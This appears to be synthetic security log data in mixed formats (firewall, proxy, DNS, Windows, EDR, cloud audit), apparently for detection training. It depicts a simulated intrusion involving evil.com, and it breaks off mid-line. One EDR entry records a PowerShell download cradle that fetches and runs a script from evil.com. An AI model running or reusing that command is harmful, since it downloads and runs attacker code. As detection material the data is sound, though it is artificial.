<log>2023-10-25T14:23:56.456789Z zeek-ssl.log {"ts":1698265436.456789,"uid":"C1234567890abcdef","id.orig_h":"10.10.10.150","id.orig_p":54321,"id.resp_h":"203.0.113.50","id.resp_p":443,"version":"TLSv12","cipher":"TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256","server_name":"evil.com","ja3":"abc123def456ghi789jkl012","ja3s":"123abc456def789ghi012jkl"}</log>
<log>2023-10-25T14:23:57.123456Z 10.0.6.200 54321 10.10.10.50 53 17 0 1 1234567898 1234567899 50 25</log>
<log>Oct 25 14:23:57.456789 vpn-gw-05[7890]: 10.10.20.70:54321 - 192.168.100.9:443 [user@domain.com] client version: 2.5.1</log>
<log>2023-10-25T14:23:58.123456Z proxy-squid-03 1234567892.456 10.10.10.150 TCP_MISS/200 54321 CONNECT evil.com:443 - DIRECT/203.0.113.50 -</log>
<log>{"EventTime":"2023-10-25T14:23:58.456789Z","EventID":4648,"EventType":"AUDIT_SUCCESS","Channel":"Security","ComputerName":"WIN10-PC03","SubjectUserSid":"S-1-5-21-123456789-1234567890-123456789-1005","SubjectUserName":"jdoe","LogonGuid":"{12345678-1234-1234-1234-123456789012}","TargetUserSid":"S-1-5-21-123456789-1234567890-123456789-1006","TargetUserName":"SERVER01$","TargetDomainName":"DOMAIN","TargetLogonGuid":"{12345678-1234-1234-1234-123456789013}","ProcessId":1234,"ProcessName":"C:\Windows\System32\lsass.exe","IpAddress":"10.10.10.150","IpPort":54321}</log>
<log>2023-10-25T14:23:59.123456Z host-macos-05 com.apple.System[1]: networkd (pid 1234) is not throttling wakeups (2 wakeups per 150 seconds)</log>
<log>Oct 25 14:23:59.456789 host-abc123 kernel: [12345.678901] Memory cgroup out of memory: Kill process 12345 (java) score 1234 or sacrifice child</log>
<log>2023-10-25T14:24:00.123456Z i-abcdef12345678901 AWSCloudTrail us-west-2 123456789012 CreateBucket API_Key_ID=AKIAI44QH8DHBEXAMPLE BucketName=my-bucket</log>
<log>2023-10-25T14:24:00.456789Z eni-78901234 10.0.4.100 198.51.100.40 25 54321 6 80 12345 ACCEPT OK</log>
<log>2023-10-25 14:24:01.123 PDT host-imac.local com.apple.xpc.launchd[1] (com.apple.photolibraryd[1234]): Attempt to set privileged port: 80</log>
<log>2023-10-25T14:24:01.456789Z 2023-10-25T14:24:01.456789Z_123.456.789.012_PANfw1 1,2023/10/25 14:24:01,001234567890,SYSTEM,threat,256,2023/10/25 14:24:01,10.10.10.150,203.0.113.50,0.0.0.0,0.0.0.0,rule_name,,,ssl,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Allowed by Policy,2023/10/25 14:24:01,4242,1,54321,443,0,0,0x400000,tcp,alert,"ET MALWARE Possible Malware CnC Beacon (HEARTBEAT)",high,client-to-server,1234567890,0x0,203.0.113.50-203.0.113.50,Russia,0,,0,,,0,,,,,,,,0,0,0,0,0,,PA-500,,,0,0,0,0,0,0,0,0,0,0</log>
<log>10/25/2023 14:24:02.123456,789016,ASA-6,302020,error,10.10.10.5,54321,8.8.8.8,53,,,Teardown TCP connection 123456789 for inside:10.10.10.5/54321 to outside:8.8.8.8/53 duration 0:00:05 bytes 12345 TCP FINs</log>
<log>{"timestamp":"2023-10-25T14:24:02.456789Z","flow_id":1234567890123456,"event_type":"alert","src_ip":"10.10.10.200","src_port":445,"dest_ip":"10.10.10.150","dest_port":54321,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2100498,"rev":1,"signature":"GPL NETBIOS SMB-DS DCERPC ISystemActivatorClient bind attempt","category":"Potentially Bad Traffic","severity":2}}</log>
<log>2023-10-25T14:24:03.123456Z ftnt-fw-06 date=2023-10-25 time=14:24:03 devname="ftnt-fw-06" devid="FGT2222222222" level=warning srcip=10.10.10.200 dstip=10.10.10.150 srcport=445 dstport=54321 srcintf="port2" dstintf="port1" sessionid=222222222 policyid=6 service="MICROSOFT-DS" proto=6 action="deny" status="reset" reason="ips_signature"</log>
<log>Oct 25 14:24:03.456789 dns-server05 named[1234]: client @0x7fabc1234567 10.10.10.200#445 (malicious.domain.com): query: malicious.domain.com IN A + (10.10.10.200)</log>
<log>2023-10-25T14:24:04.123456Z dhcp-server06 dhcpd: DHCPRELEASE of 10.10.10.100 from aa:bb:cc:dd:ee:ff (host-abc) via eth0</log>
<log>{"logType":"AZURE_ACTIVITY","time":"2023-10-25T14:24:04.456789Z","resourceId":"/SUBSCRIPTIONS/12345678-1234-1234-1234-123456789012/RESOURCEGROUPS/RG-PROD/PROVIDERS/MICROSOFT.NETWORK/PUBLICIPADDRESSES/PIP-PROD-01","operationName":"MICROSOFT.NETWORK/PUBLICIPADDRESSES/DELETE","properties":{"statusCode":"OK","statusMessage":"Public IP address 'PIP-PROD-01' deleted"}}</log>
<log>2023-10-25T14:24:05.123456Z 123456789012 PROJECT_ID cloudaudit.googleapis.com/activity 2023-10-25T14:24:05.123456Z {"logName":"projects/PROJECT_ID/logs/cloudaudit.googleapis.com%2Factivity","protoPayload":{"@type":"type.googleapis.com/google.cloud.audit.AuditLog","status":{},"authenticationInfo":{"principalEmail":"admin@domain.com"},"requestMetadata":{"callerIp":"10.10.10.120"},"serviceName":"compute.googleapis.com","methodName":"v1.compute.instances.insert"}}</log>
<log>2023-10-25T14:24:05.456789Z 10.10.10.100 54321 10.10.10.10 3389 - - - - - - - - - - RECV_PACKET - 1234567895 - x.x.x.x</log>
<log>Oct 25 14:24:06.123456 dc06.domain.local kerberos(5): KRB5KDC_ERR_CLIENT_REVOKED: 10.10.10.70(54321) - CLIENT$@DOMAIN.LOCAL Certificate revoked</log>
<log>{"timestamp":"2023-10-25T14:24:06.456789Z","event":"sso","result":"SUCCESS","source_ip":"10.10.10.130","user":"bob.wilson@company.com","app":"salesforce-prod"}</log>
<log>2023-10-25T14:24:07.123456Z endpoint-edr-06 1234567895 DNS_QUERY PID=1234 Image=C:\Windows\System32\powershell.exe User=DOMAIN\jdoe QueryName="evil.com" QueryType="A" QueryResults="203.0.113.50"</log>
<log>Oct 25 14:24:07.456789 host-av-06 kaspersky: Detected: UDS:DangerousObject.Multi.Generic in http://evil.com/malware.exe</log>
<log>2023-10-25T14:24:08.123456Z zeek-files.log {"ts":1698265448.123456,"uid":"C1234567890abcdef","tx_hosts":["10.10.10.150"],"rx_hosts":["203.0.113.50"],"conn_uids":["C1234567890abcdef"],"source":"HTTP","depth":0,"analyzers":["MD5","SHA1"],"mime_type":"application/x-msdownload","filename":"malware.exe","md5":"abc123def456ghi789jkl012","sha1":"123abc456def789ghi012jkl345mno678pqr901"}</log>
<log>2023-10-25T14:24:08.456789Z 10.0.7.50 54321 10.10.10.60 389 6 0 1 1234567900 1234567901 60 30</log>
<log>Oct 25 14:24:09.123456 vpn-gw-06[2345]: 10.10.20.80:54321 - 192.168.100.10:443 [user@domain.com] logout</log>
<log>2023-10-25T14:24:09.456789Z proxy-squid-04 1234567893.789 10.10.10.150 TCP_MISS/200 54321 GET https://evil.com/malware.exe - DIRECT/203.0.113.50 application/x-msdownload</log>
<log>{"EventTime":"2023-10-25T14:24:10.123456Z","EventID":4625,"EventType":"AUDIT_FAILURE","Channel":"Security","ComputerName":"WIN-SERVER04","TargetUserSid":"S-1-5-21-123456789-1234567890-123456789-1007","TargetUserName":"attacker","IpAddress":"10.10.10.200","IpPort":54321,"LogonType":3,"FailureReason":"%%2313"}</log>
<log>2023-10-25T14:24:10.456789Z host-macos-06 com.apple.screensharing[1234]: Connection from 10.10.10.200:54321 rejected: Invalid password.</log>
<log>Oct 25 14:24:11.123456 host-abc123 kernel: [12345.678901] TCP: time wait bucket table overflow</log>
<log>2023-10-25T14:24:11.456789Z i-987654321fedcba0 AWSCloudTrail us-east-1 123456789012 DeleteBucket API_Key_ID=AKIAIOSFODNN7EXAMPLE BucketName=my-bucket</log>
<log>2023-10-25T14:24:12.123456Z eni-12345678 10.0.5.100 198.51.100.50 22 54321 6 35 2345 ACCEPT OK</log>
<log>2023-10-25 14:24:12.456 MST host-macpro.local com.apple.xpc.launchd[1] (com.apple.screensharing[1234]): Service exited with abnormal code: 255</log>
<log>2023-10-25T14:24:13.123456Z 2023-10-25T14:24:13.123456Z_123.456.789.012_PANfw1 1,2023/10/25 14:24:13,001234567890,SYSTEM,threat,256,2023/10/25 14:24:13,10.10.10.150,203.0.113.50,0.0.0.0,0.0.0.0,rule_name,,,http,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Allowed by Policy,2023/10/25 14:24:13,4242,1,54321,80,0,0,0x400000,tcp,alert,"ET MALWARE Win32/Possible Malware Download",high,client-to-server,1234567890,0x0,203.0.113.50-203.0.113.50,Russia,0,,0,,,0,,,,,,,,0,0,0,0,0,,PA-500,,,0,0,0,0,0,0,0,0,0,0</log>
<log>10/25/2023 14:24:13.456789,789017,ASA-7,302021,error,10.10.10.5,54321,8.8.8.8,53,,,Teardown UDP connection 123456789 for inside:10.10.10.5/54321 to outside:8.8.8.8/53 duration 0:00:01 bytes 123</log>
<log>{"timestamp":"2023-10-25T14:24:14.123456Z","flow_id":1234567890123456,"event_type":"alert","src_ip":"10.10.10.5","src_port":54321,"dest_ip":"8.8.8.8","dest_port":53,"proto":"UDP","alert":{"action":"allowed","gid":1,"signature_id":2100498,"rev":1,"signature":"GPL DNS query for .ru domain","category":"Potential Corporate Privacy Violation","severity":1}}</log>
<log>2023-10-25T14:24:14.456789Z ftnt-fw-07 date=2023-10-25 time=14:24:14 devname="ftnt-fw-07" devid="FGT1111111111" level=notice srcip=10.10.10.5 dstip=8.8.8.8 srcport=54321 dstport=53 srcintf="port1" dstintf="port2" sessionid=111111111 policyid=7 service="DNS" proto=17 action="accept" status="close" duration=1 sentbyte=123 rcvdbyte=456</log>
<log>Oct 25 14:24:15.123456 dns-server06 named[1234]: client @0x7fabc1234567 10.10.10.5#54321 (suspicious.ru): query: suspicious.ru IN A + (10.10.10.5)</log>
<log>2023-10-25T14:24:15.456789Z dhcp-server07 dhcpd: DHCPNAK on 10.10.10.200 to aa:bb:cc:dd:ee:ff (host-xyz) via eth1</log>
<log>{"logType":"AZURE_ACTIVITY","time":"2023-10-25T14:24:16.123456Z","resourceId":"/SUBSCRIPTIONS/12345678-1234-1234-1234-123456789012/RESOURCEGROUPS/RG-DEV/PROVIDERS/MICROSOFT.WEB/SITES/APP-DEV-01","operationName":"MICROSOFT.WEB/SITES/DELETE","properties":{"statusCode":"OK","statusMessage":"Web app 'APP-DEV-01' deleted"}}</log>
<log>2023-10-25T14:24:16.456789Z 123456789012 PROJECT_ID cloudaudit.googleapis.com/activity 2023-10-25T14:24:16.456789Z {"logName":"projects/PROJECT_ID/logs/cloudaudit.googleapis.com%2Factivity","protoPayload":{"@type":"type.googleapis.com/google.cloud.audit.AuditLog","status":{},"authenticationInfo":{"principalEmail":"service-account@project-id.iam.gserviceaccount.com"},"requestMetadata":{"callerIp":"10.10.10.140"},"serviceName":"pubsub.googleapis.com","methodName":"google.pubsub.v1.Publisher.Publish"}}</log>
<log>2023-10-25T14:24:17.123456Z 10.10.10.110 54321 10.10.10.10 3389 - - - - - - - - - - SENT_PACKET - 1234567896 - x.x.x.x</log>
<log>Oct 25 14:24:17.456789 dc07.domain.local kerberos(5): KRB5KDC_ERR_KEY_EXPIRED: 10.10.10.80(54321) - user@DOMAIN.LOCAL Password expired</log>
<log>{"timestamp":"2023-10-25T14:24:18.123456Z","event":"sso","result":"SUCCESS","source_ip":"10.10.10.150","user":"carol.white@company.com","app":"workday-prod"}</log>
<log>2023-10-25T14:24:18.456789Z endpoint-edr-07 1234567896 POWER_SHELL_SCRIPTBLOCK PID=1234 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe User=DOMAIN\jdoe ScriptBlockText="IEX ((New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1'))"</log>
<log>Oct 25 14:24:19.123456 host-av-07 bitdefender: Gen:Variant.Zusy.123456 detected in C:\Users\user\Downloads\file.exe and quarantined.</log>
<log>2023-10-25T14:24:19.456789Z zeek-dns.log {"ts":1698265459.456789,"uid":"C1234567890abcdef","id.orig_h":"10.10.10.5","id.orig_p":54321,"id.resp_h":"8.8.8.8","id.resp_p":53,"proto":"udp","query":"suspicious.ru","qtype":"A","rcode":0,"answers":["203.0.113.60"]}</log>
<log>2023-10-25T14:24:20.123456Z 10.0.8.100 54321 10.10.10.70 636 6 0 1 1234567902 1234567903 70 35</log>
<log>Oct 25 14:24:20.456789 vpn-gw-07[6789]: 10.10.20.90:54321 - 192.168.100.11:443 [user@domain.com] session started.</log>
<log>2023-10-25T14:24:21.123456Z proxy-squid-05 1234567894.012 10.10.10.5 TCP_MISS/200 54321 GET http://suspicious.ru/ - DIRECT/203.0.113.60 text/html</log>
<log>{"EventTime":"2023-10-25T14:24:21.456789Z","EventID":4732,"EventType":"AUDIT_SUCCESS","Channel":"Security","ComputerName":"WIN-SERVER05","TargetUserSid":"S-1-5-21-123456789-1234567890-123456789-1008","TargetUserName":"jdoe","TargetDomainName":"DOMAIN","SubjectUserSid":"S-1-5-21-123456789-1234567890-123456789-500","SubjectUserName":"Administrator","MemberSid":"S-1-5-21-123456789-1234567890-123456789-1009","MemberName":"attacker","MembershipOperation":"AddedToGroup"}</log>
<log>2023-10-25T14:24:22.123456Z host-macos-07 com.apple.softwareupdate[1234]: SUOScheduler: Checked for available updates: none</log>
<log>Oct 25 14:24:22.456789 host-abc123 kernel: [12345.678901] EXT4-fs (sda1): re-mounted. Opts: (null)</log>
<log>2023-10-25T14:24:23.123456Z i-1234567890abcdef0 AWSCloudTrail us-east-1 123456789012 CreateSecurityGroup API_Key_ID=AKIAIOSFODNN7EXAMPLE GroupId=sg-abcdef01</log>
<log>2023-10-25T14:24:23.456789Z eni-90123456 10.0.6.100 198.51.100.60 443 54321 6 90 5678 ACCEPT OK</log>
<log>2023-10-25 14:24:24.123 HST host-macmini.local com.apple.xpc.launchd[1] (com.apple.ReportCrash[1234]): Endpoint has been activated over 100 times in the last 100 seconds. Ignoring wakeups for 100 seconds.</log>
<log>2023-10-25T14:24:24.456789Z 2023-10-25T14:24:24.456789Z_123.456.789.012_PANfw1 1,2023/10/25 14:24:24,001234567890,SYSTEM,threat,256,2023/10/25 14:24:24,10.10.10.5,203.0.113.60,0.0.0.0,0.0.0.0,rule_name,,,http,vsys1,trust,untrust,ethernet1/
